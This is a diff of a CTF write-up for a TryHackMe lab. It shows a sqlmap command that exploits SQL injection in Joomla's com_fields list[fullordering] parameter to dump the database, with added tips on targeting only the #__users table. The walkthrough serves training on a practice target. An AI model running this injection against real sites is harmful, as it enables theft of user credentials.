@@ -113,9 +113,13 @@ This is not the best way to complete the CTF challenge, you could just dump the 
 ```shell
 sqlmap -u "http://10.10.217.112/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dump-all -p list[fullordering]
 ```
-If you receive any messages or requests during the process just follow what I did below.<br />
+If you receive any messages or requests during the process just follow what I did below. If you understand what it's asking you, feel free to say no until you get the tables you want to dump.<br />
 ![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT14.png?raw=true)<br />
 
+
+
+In the example below I only pulled the table #__users and the columns, this is what you'll want to do if you want to skip dumping the whole database.<br />
+![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/Daily_Bugle/screenshots/SCREENSHOT15.png?raw=true)<br />
 
 
 
